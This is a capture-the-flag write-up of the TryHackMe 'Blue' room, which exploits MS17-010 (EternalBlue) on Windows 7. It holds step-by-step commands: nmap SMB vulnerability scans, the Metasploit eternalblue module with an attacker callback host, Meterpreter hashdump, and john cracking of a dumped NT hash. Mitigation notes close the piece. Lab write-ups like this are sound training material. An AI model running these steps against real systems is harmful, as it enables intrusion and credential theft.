---
title: "SMB Exploit (MS17-010 EternalBlue) – Remote Code Execution & Privilege Escalation | Blue"
date: 2026-04-07 22:45:00 +0530
categories: [Penetration Testing]
tags: [
  eternalblue,
  ms17-010,
  smb,
  remote-code-execution,
  privilege-escalation,
  windows,
  metasploit,
  tryhackme
]
platform: TryHackMe
author: Shivansh Sharma
image: { path: /assets/images/posts/blue.webp, alt: Blue Room }
---

## Overview

This room demonstrates exploitation of a critical SMB vulnerability (MS17-010), commonly known as EternalBlue. The attack leads to remote code execution on a Windows machine and full system compromise.

---

## Objective

- Enumerate target services
- Identify SMB vulnerability
- Exploit MS17-010
- Dump and crack hashes
- Retrieve flags

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC <target_ip>
```

**Results:**

- `135` → MSRPC
- `139` → NetBIOS
- `445` → SMB (Windows 7 SP1)
- `3389` → RDP
- Multiple RPC ports

---

### SMB Enumeration

#### Vulnerability Scan

```bash
nmap -p445 --script smb-vuln* <target_ip>
```

**Result:**

```
VULNERABLE: MS17-010 (EternalBlue)
```

---

## Exploitation

### Start Metasploit

```bash
msfconsole
```

### Search for Exploit

```
search ms17_010
```

### Use EternalBlue Exploit

```
use exploit/windows/smb/ms17_010_eternalblue
```

### Configure Options

```
set RHOSTS <target_ip>
set LHOST <attacker_ip>
check
```

### Run Exploit

```
exploit
```

This gives a **Meterpreter shell**.

---

## Post Exploitation

### Dump Password Hashes

```
hashdump
```

**Output:**

```
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0
Jon:1000:...:ffb43f0de35be4d9917ac0cc8ad57f8d
```

### Understanding Hashes

- `31d6cfe0d16ae931b73c59d7e0c089c0` → Empty password
- Target hash:

```
ffb43f0de35be4d9917ac0cc8ad57f8d
```

### Crack Password

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Password:**

```
alqfna22
```

---

## Flags

### Flag 1

```
cat C:/flag1.txt
```

### Flag 2

```
cat C:/Windows/System32/config/flag2.txt
```

### Flag 3

```
cat C:/Users/Jon/Documents/flag3.txt
```

---

## Impact

- Critical SMB vulnerability allows remote code execution
- No authentication required
- Full system compromise achieved
- Credential extraction possible

---

## Mitigation

- Apply MS17-010 patch immediately
- Disable SMBv1
- Restrict SMB access via firewall
- Monitor unusual SMB activity

---

## Real-World Insight

The EternalBlue exploit was widely used in real-world attacks like WannaCry ransomware, affecting thousands of systems globally.

Unpatched legacy systems remain highly vulnerable and are still actively targeted.

---

## Conclusion

This room highlights:

- Importance of patch management
- Risks of outdated Windows systems
- Power of public exploits like EternalBlue

> A single unpatched vulnerability can lead to complete system takeover.